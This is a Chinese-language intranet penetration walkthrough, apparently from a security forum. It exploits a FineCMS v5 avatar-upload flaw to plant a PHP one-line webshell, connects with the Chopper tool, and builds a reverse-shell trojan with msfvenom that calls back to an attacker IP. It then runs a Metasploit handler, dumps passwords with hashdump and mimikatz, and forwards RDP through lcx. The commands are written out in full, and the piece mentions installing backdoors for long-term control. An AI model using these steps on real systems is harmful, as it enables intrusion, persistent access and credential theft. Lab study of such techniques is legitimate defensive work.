**内网渗透思路**

> **本次内网渗透的思路为**：通过信息收集对网站进行分析，通过攻击外网服务器，从而获取外网服务器的权限，然后利用入侵成功的外网服务器作为跳板来攻击内网其他服务器，最后获得敏感数据（系统密码等），看情况安装后门木马或者后门软件，实现长期控制和获得敏感数据的方式。  
> **还有一种内网渗透的思路为**：通过社工等方法攻击企业办公网的电脑、办公网无线等，实现控制办公电脑，再用获得的办公网数据。

**渗透过程详解**  
本次渗透过程将分为webshell---&gt;getshell---&gt;提权  
webshell访问某网站，该网站利用的是FineCMS v5系统建站，创建一个新的用户进行测试。[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a613f2096cc5c8cd00d380115e7cea67b049e2ca.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a613f2096cc5c8cd00d380115e7cea67b049e2ca.png)  
初步判断该网页模板为finecms v5建站系统，然后注册一个新的用户，方便我们利用finecms v5系统的文件上传漏洞  
参考链接：<https://blog.csdn.net/dfdhxb995397/article/details/101384946>  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0258cf08f2802f48c704c1dc376ad0939d74072c.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0258cf08f2802f48c704c1dc376ad0939d74072c.png)  
文件上传漏洞在会员头像处，所以先注册一个账号然后登录后上传我们的一句话木马  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b84369ba691f4a4318d1d720d3b6ef9249700ced.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b84369ba691f4a4318d1d720d3b6ef9249700ced.png)  
最开始的文件格式是0x0.png  
通过burp代理拦截将tx后面的image/png换成image/php即可  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-df207e17b145f1e344c86000d6f344d4723584ca.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-df207e17b145f1e344c86000d6f344d4723584ca.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-db0ad3572bc5e6db215522e6082d27e79fba49ab.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-db0ad3572bc5e6db215522e6082d27e79fba49ab.png)  
输入参数v=phpinfo();验证成功[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a38fa7ee217c27d1e69ce1b753c4d31ac7a03d89.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a38fa7ee217c27d1e69ce1b753c4d31ac7a03d89.png)  
验证上传成功后，打开菜刀软件输入上传的网站路径和参数（一句话木马的密码），可以连接服务器  
在菜刀软件上可以进行数据库的提权，如mof提权、udf提权、启动项提权等  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b5d122756d9fd3b81be79b3c4006018e6b5b0826.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-b5d122756d9fd3b81be79b3c4006018e6b5b0826.png)  
编写免杀木马  
通过webshell连接目标服务器，但是访问的数据有限，仅仅是站点的系统账户权限，访问的系统路径也有限，于是我们可以编写免杀木马来进行反弹shell木马su.exe

```shell
Msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=192.168.10.130 lport=4444 -f exe >/root/Desktop/su.exe
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-99d12641b1e3faeeb3af5505cf52fcdacff61f9f.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-99d12641b1e3faeeb3af5505cf52fcdacff61f9f.png)  
利用刚刚连接菜刀的操作，在文件管理中上传我们需要的工具[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-20d3422f836b159722d4f912b4d857f2555422ab.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-20d3422f836b159722d4f912b4d857f2555422ab.png)  
进入meterpreter攻击模块，配置参数

```shell
use exploit/multi/handler
Set payload/windows/x64/meterpreter/reverse_tcp
Set lport 4444
Set lhost 192.168.10.130
run
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4154bc4da64a9c634b0e65b9700094fc02a33fc9.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4154bc4da64a9c634b0e65b9700094fc02a33fc9.png)  
可以利用菜刀的虚拟终端模拟win2008服务器点击免杀木马的操作，让木马生效  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d5c15d97314073b8d500c4dbfecf17f2ef17b2ee.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-d5c15d97314073b8d500c4dbfecf17f2ef17b2ee.png)  
run执行监听  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1d7d75a232238bb3e1ff9faedfbf3c1923f1eb18.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-1d7d75a232238bb3e1ff9faedfbf3c1923f1eb18.png)  
**获取密码过程**

```shell
hashdump
load mimikatz
kerberos
```

[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-eeaf60f4effd18288305bbc26cfbd01dd31f9518.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-eeaf60f4effd18288305bbc26cfbd01dd31f9518.png)  
**注：如果win2008的远程桌面操作是不允许连接到这台计算机，那么开启端口转发也是没用的**  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5bbc92dbdca7c0c61ad68bd9fe748ce353a027c4.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-5bbc92dbdca7c0c61ad68bd9fe748ce353a027c4.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-296c3396d7ea43beb15b74f4dcce30cd571089d1.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-296c3396d7ea43beb15b74f4dcce30cd571089d1.png)  
开启远程桌面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-bf5d589376d114895fbbf1930256138285e42f9c.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-bf5d589376d114895fbbf1930256138285e42f9c.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0c86a2fd807a3c56f9cc63120024bb38d136b307.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-0c86a2fd807a3c56f9cc63120024bb38d136b307.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-39ec8e911ccaa1ce6d603cc2492b19f5d5c8e0c0.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-39ec8e911ccaa1ce6d603cc2492b19f5d5c8e0c0.png)  
**思路一：利用meterpreter模块执行远程连接**  
然后开启端口转发，-l（本地端口）-p（远程控制端口）-r（目标主机）  
靶机3389端口转发发送到本地的5555端口  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-781d53f67e9bf82520c2958584d9aa6f4e875a50.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-781d53f67e9bf82520c2958584d9aa6f4e875a50.png)  
Rdesktop -u 用户名 -p 密码 127.0.0.1：5555 连接本地的5555端口开启远程桌面  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-07645c88d8022891de8e1b8926b9616fbf35d138.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-07645c88d8022891de8e1b8926b9616fbf35d138.png)  
利用windows开启远程桌面，需要利用lcx工具，现在shell模式下输入指令  
靶机执行lcx.exe -slave 192.168.10.20 5555 192.168.10.10 3389  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-946ccadbcd7b53662c56c81db26627effc7f9aed.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-946ccadbcd7b53662c56c81db26627effc7f9aed.png)  
**思路二：利用lcx工具执行远程连接**  
攻击机执行lcx.exe. -listen 5555 33891，接着打开mstsc连接127.0.0.1 ：33891[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c53709862f91280cbdbe60bf68068efb6aeb5b05.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-c53709862f91280cbdbe60bf68068efb6aeb5b05.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a475f8e0b8f6a5eee194da7c8ed603d8e0b81a64.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-a475f8e0b8f6a5eee194da7c8ed603d8e0b81a64.png)  
以下为连接成功和监听数据的发送[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9f4eec0fb9486c1c1f9ec8bc3c8e1a17880d49db.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-9f4eec0fb9486c1c1f9ec8bc3c8e1a17880d49db.png)  
[![](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4ddf5ddb4993444fbaaeb698ec9d8cac71d08408.png)](https://shs3.b.qianxin.com/attack_forum/2021/07/attach-4ddf5ddb4993444fbaaeb698ec9d8cac71d08408.png)  
**总结**  
不同的操作系统可能存在版本漏洞、中间件漏洞、组件漏洞、端口服务漏洞等，在渗透测试的过程中可以通过信息收集来获取思路。